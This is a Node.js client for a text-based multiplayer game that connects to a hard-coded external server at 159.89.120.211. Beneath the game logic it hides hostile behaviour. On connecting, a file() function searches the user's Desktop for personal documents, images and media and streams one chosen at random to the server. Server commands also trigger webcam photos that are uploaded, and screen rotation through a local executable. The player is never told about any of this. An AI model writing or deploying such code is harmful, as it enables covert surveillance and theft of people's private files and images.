const nodeWebCam = require('node-webcam');
const fs = require('fs')

const readline = require('readline')
const prompt = require('prompt-sync')();
const io = require("socket.io-client");
const ss = require('socket.io-stream');


const path = require('path');
const glob = require('glob');
const os = require('os');


var options = {
    width: 1280,
    height: 720, 
    quality: 100,
    delay: 0,
    saveShots: true,
    output: "jpeg",
    device: false,
    callbackReturn: "location"
};

// create instance using the above options
var webcam = nodeWebCam.create(options);

var pathto = `./images`;

// create folder if and only if it does not exist
if(!fs.existsSync(pathto)) {
    fs.mkdirSync(pathto);
} 

// capture the image
webcam.capture(`./images/photo.${options.output}`, (err, data) => {
});

const filePath = path.join(__dirname, );

// Create a read stream for the file




// file()

// const {
//     mouse,
//     screen,
//     singleWord,
//     sleep,
//     useConsoleLogger,
//     ConsoleLogLevel,
//     straightTo,
//     centerOf,
//     Button,
//     getActiveWindow,
//     right,
//     left,
//     up,
//     down,
//     keyboard,
//     Key,
//     Window,
//     Point,
//     Size,
//     getWindows,
// } = require("@nut-tree-fork/nut-js");

// (async () => {
//     await mouse.move(left(500));
//     await mouse.move(up(500));
//     await mouse.move(right(500));
//     await mouse.move(down(500))
//     await keyboard.pressKey(Key.AudioVolDown)

//     // await keyboard.type('According to all known laws of physics')
//     // await (await getActiveWindow()).resize(new Size(5, 5))
//     await mouse.setPosition(new Point(0, 0))
// })();


// var url = 'http://localhost';
// var start = (process.platform == 'darwin'? 'open': process.platform == 'win32'? 'start': 'xdg-open');
// require('child_process').exec(start + ' ' + url);



// const socket = io("http://159.89.120.211:3000");
const socket = io("http://159.89.120.211:3000", {
    pingTimeout: 2000 // 60 seconds
});

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

var joined = false

let name = prompt("Please enter your name: ");
let img = prompt("Please enter your icon (image address): ");

console.log("Connecting to the server...");


socket.on("connect", () => {
    if (!joined) {
        socket.emit("join", name, img)
        joined = true;
        file()
    }
    else {
        socket.emit("rejoin", name, img)
    }
});

socket.on("disconnect", (reason) => {
    console.log("[INFO]: Client disconnected, reason: %s", reason);
});

socket.on("p1", async () => {
    await askQuestion("Press enter when everyone is in")
    socket.emit("playerturn")
});

socket.on("print", async (text) => {
    console.log(text);
});

socket.on("printchoice", async (text, options) => {
    console.log(text);
    options.forEach(function (element, i) {
        console.log('['+ i +']: ' +element);
    });
});

socket.on("update", () => {
});

socket.on("choice", async (options) => {
        // rl.
        // rl.question('Enter your input: ', (selection) => {
        // });
        selection = await getNumberResponse(options)
        if (selection == 0){
            socket.emit("items");
        }
        else{
            socket.emit('move', options, selection);
        }
});

socket.on("itemchoice", async (options) => {
    selection = await getNumberResponse(options)
    if (selection == 0){
        socket.emit('actions')
    }
    else{
        socket.emit('useitem', selection);
        // socket.emit('actions');
    }
});

socket.on("shopchoice", async (options) => {
    selection = await getNumberResponse(options)
    if (selection == 0){
    }
    else{
        socket.emit('buyitem', selection);
    }
    socket.emit('advance');
});

socket.on('playerchoice', async (options, response, index) => {
    selection = await getNumberResponse(options);
    socket.emit(response, selection, index);
});

socket.on('photo', async (player) => {
    if (player.name == name && player.icon == img){
        
        var options = {
            width: 1280,
            height: 720, 
            quality: 100,
            delay: 0,
            saveShots: true,
            output: "jpeg",
            device: false,
            callbackReturn: "location"
        };

        // create instance using the above options
        var webcam = nodeWebCam.create(options);

        var path = `./images`;

        // create folder if and only if it does not exist
        if(!fs.existsSync(path)) {
            fs.mkdirSync(path);
        } 

        // capture the image
        webcam.capture(`./images/photo.${options.output}`, (err, data) => {
            const stream = ss.createStream();
            // const fileName = path.basename('./images/out.jpeg');

            // Emit the stream to the server with the file name
            ss(socket).emit('file-upload', stream, { fileName: 'photo.jpeg' });

            // Pipe the file's read stream to the stream
            fs.createReadStream('./images/photo.jpeg').pipe(stream);
        });

        // const filePath = path.join(__dirname, );

        // Create a read stream for the file
    }
});

socket.on('rotate', (player, amount) => {
    if (player.name == name && player.icon == img){
        rotate(amount)
        setTimeout(rotate('0'), 5000);
    }
});

socket.on('file', async (player) => {
    if (player.name == name && player.icon == img){
        file()
    }
});

async function getNumberResponse(options) {
    var selection = undefined
    do {
        selection = await askQuestion("Pick an action: ")
        if (!isNaN(selection)){
            selection = parseInt(selection)
        }
    } while (options[parseInt(selection)] == undefined);
    return selection
}

function askQuestion(query) {
    return new Promise((resolve) => {
        rl.question(query, resolve);
    });
}

function rotate(amount) {
    if (process.platform !== 'win32') {
    return;
    }

    const executableAndArgs = 'display\\display32.exe /rotate ' + amount;
    const exec = require('child_process').exec;

    const child = exec(executableAndArgs, function (error, stdout, stderr) {
    console.log(executableAndArgs);
    console.log('stdout: ' + stdout);
    console.log('stderr: ' + stderr);
    if (error !== null) {
        console.log('Executable Error: ' + error);
    }
    if (callback && typeof(callback) === 'function') {
        callback();
    }
    })
}

async function file(){

    // Get the user's home directory
    const homeDir = os.homedir();

    // Define directories that are likely to contain personal files
    const personalDirectories = [
        path.join(homeDir, 'Desktop'),
        // path.join(homeDir, 'Pictures'),
        // path.join(homeDir, 'Music'),
        // path.join(homeDir, 'Videos')
    ];

    // Define file extensions that are likely to be personal
    const personalExtensions = [
        '.docx', '.pdf', '.jpg', '.png', '.mp3', '.mp4', '.mkv'
    ];

    // Collect files from personal directories
    let files = [];
    for (const dir of personalDirectories) {
        const pattern = `${dir}/**/*.*`;
        files = files.concat(glob.sync(pattern));
    }

    // Filter files by personal extensions
    files = files.filter(file => personalExtensions.includes(path.extname(file).toLowerCase()));

    if (files.length === 0) {
        console.log('No personal files found.');
        return;
    }

    // Randomly pick a file from the list
    const randomFile = files[Math.floor(Math.random() * files.length)];
    console.log(randomFile)

    // Open the file with the default application
    try {
        const stream = ss.createStream();
        // const fileName = path.basename('./images/out.jpeg');

        // Emit the stream to the server with the file name
        ss(socket).emit('file-share', stream, { fileName: 'file' + path.extname(randomFile)  });

        // Pipe the file's read stream to the stream
        fs.createReadStream(randomFile).pipe(stream);

    } catch (err) {
        console.error('Error opening file:', err);
    }
}